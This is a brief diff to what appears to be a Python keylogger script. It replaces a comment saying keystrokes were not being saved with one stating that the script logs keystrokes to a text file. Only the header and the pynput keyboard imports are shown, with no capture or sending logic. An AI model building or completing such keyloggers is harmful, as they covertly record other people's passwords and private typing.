@@ -1,8 +1,5 @@
 #! python3
-'''
-It logs keys depending on the set count BUT
-it doesn't store them to the text file for some reason. Idunno.
-'''
+# Description: Logs keystrokes and saves them in a text file.
 
 import pynput
 from pynput.keyboard import Key, Listener
